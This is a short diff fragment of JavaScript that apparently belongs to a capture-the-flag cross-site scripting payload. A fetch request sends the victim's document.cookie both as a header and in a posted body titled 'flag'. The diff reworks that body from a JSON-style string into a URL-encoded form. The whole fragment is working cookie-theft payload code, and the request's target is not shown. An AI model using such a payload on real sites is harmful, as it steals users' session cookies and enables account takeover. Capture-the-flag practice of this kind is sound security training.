@@ -7,9 +7,5 @@ headers: {
   'cookie': document.cookie
 },
 
-body: `{
-   "title": "flag",
-   "content": document.cookie,
-   "submit": "save"
-  }`,
+body:"title=flag&content="+document.cookie+"&submit=save",
 });
